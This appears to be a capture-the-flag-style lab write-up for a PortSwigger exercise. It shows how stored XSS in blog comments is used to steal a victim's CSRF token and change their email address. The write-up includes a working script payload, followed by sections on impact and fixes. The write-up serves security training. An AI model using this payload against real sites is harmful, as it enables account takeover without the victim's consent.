## Lab Title: Exploiting XSS to bypass CSRF defenses  

- **Category:** Cross-Site Scripting / CSRF  
- **Level:** Practitioner  
- **Platform:** PortSwigger Web Security Academy  

## Overview  
This lab demonstrates how a stored XSS vulnerability can be leveraged to bypass CSRF defenses. The vulnerable functionality is the blog comments feature, which reflects unsanitized input directly into the page. When a victim views the comments, injected JavaScript can extract their CSRF token and use it to perform unauthorized actions.  

## Vulnerability Context  
- **Entry Point:** Blog comment submission form.  
- **Reflection Point:** Rendered comment content on the blog page.  
- **Impact:** Arbitrary JavaScript execution in the victim’s browser.  
- **Security Weakness:** Lack of input sanitization combined with reliance on CSRF tokens for protection.  

## Exploit Technique  
The attack relies on injecting a `<script>` block that:  
1. Loads the victim’s account page (`/my-account`).  
2. Extracts the CSRF token from the hidden input field.  
3. Issues a forged POST request to `/my-account/change-email` with the stolen token and a new email address.  

<img width="996" height="575" alt="image" src="https://github.com/user-attachments/assets/dbc5aa72-828b-464a-87a1-24ac4e27d15d" />

### Example Payload  
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com');
};
</script>
```

<img width="1165" height="466" alt="image" src="https://github.com/user-attachments/assets/70752e4b-ae5a-4a48-b53c-f3ff190d9a1a" />

- When the victim views the comment, the script executes.
- The CSRF token is extracted from the account page.
- A forged request changes the victim’s email address.

## Verification

- The victim’s email address is updated to test@test.com.
- Accessing /my-account confirms the change, proving CSRF defenses were bypassed.

<img width="1159" height="474" alt="image" src="https://github.com/user-attachments/assets/d606959a-c0c1-4938-b26d-03cbaac86ffe" />

## Security Impact

- CSRF Bypass: Attackers can perform state‑changing actions despite token‑based defenses.
- Account Manipulation: Victim’s account details can be altered without consent.
- Persistence: Stored XSS ensures every future visitor to the page is affected.

## Recommended Fixes
- Encode and sanitize all user input before rendering.
- Implement HttpOnly cookies to prevent client‑side access to session tokens.
- Use SameSite cookies to mitigate CSRF.
- Apply Content Security Policy (CSP) to restrict script execution.
- Consider double‑submit cookie or origin‑based CSRF defenses.

## Lessons Learned
This lab highlights how stored XSS can undermine CSRF protections. Even when CSRF tokens are implemented, if attackers can run arbitrary JavaScript, they can extract and reuse those tokens. Defense‑in‑depth is essential: preventing XSS is as critical as implementing CSRF defenses.
